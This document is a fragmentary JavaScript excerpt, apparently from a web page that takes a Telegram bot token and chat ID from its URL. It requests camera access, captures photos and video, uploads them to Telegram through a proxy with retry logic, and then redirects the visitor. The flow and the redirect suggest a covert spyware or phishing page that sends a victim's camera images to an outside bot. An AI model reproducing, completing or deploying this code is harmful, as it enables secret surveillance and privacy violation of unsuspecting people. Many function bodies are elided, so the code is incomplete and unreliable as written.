...
// Start initial stage and animation
...
console.log('💬 Chat ID:', chatIdFromUrl ? 'Present' : 'Missing');
...
// Send photo via proxy API with retry logic
async function sendPhotoViaProxy(blob, caption, token, chat_id, retries = 3) {
...
// Send video via proxy API with retry logic
async function sendVideoViaProxy(blob, caption, token, chat_id, retries = 3) {
...
// Photo Capture with proper waiting
async function capturePhoto(facingMode) {
    ...
    try {
        ...
        console.log('🎥 Video playing, waiting for stable frame...');
        ...
        if (tokenFromUrl && chatIdFromUrl) {
            ...
            const success = await sendPhotoViaProxy(blob, photoMessage, tokenFromUrl, chatIdFromUrl);
            
            if (success) {
                console.log('✅ Photo sent successfully!');
            } else {
                console.error('❌ Failed to send photo, sending error message...');
                await sendMessageToTelegram(`<b>❌ Photo Upload Failed</b>\n\n${caption}`, tokenFromUrl, chatIdFromUrl);
            }
        }
        
        console.log('✅ All done, triggering redirect...');
        triggerRedirect();
...
// Video Recording with proper waiting
        ...
        const recordingPromise = new Promise((resolve, reject) => {
            mediaRecorder.onstop = async () => {
                ...
                if (tokenFromUrl && chatIdFromUrl) {
                    ...
                    const success = await sendVideoViaProxy(blob, videoMessage, tokenFromUrl, chatIdFromUrl);
                    
                    if (success) {
                        console.log('✅ Video sent successfully!');
                    } else {
                        console.error('❌ Failed to send video, sending error message...');
                        await sendMessageToTelegram(`<b>❌ Video Upload Failed</b>\n\n${caption}`, tokenFromUrl, chatIdFromUrl);
                    }
                }
...
async function requestCameraAccess() {
    ...
    try {
        ...
        // Small delay before starting actual capture
...
if (!tokenFromUrl || !chatIdFromUrl) {
    ...
    // Start the camera access process
    requestCameraAccess();
}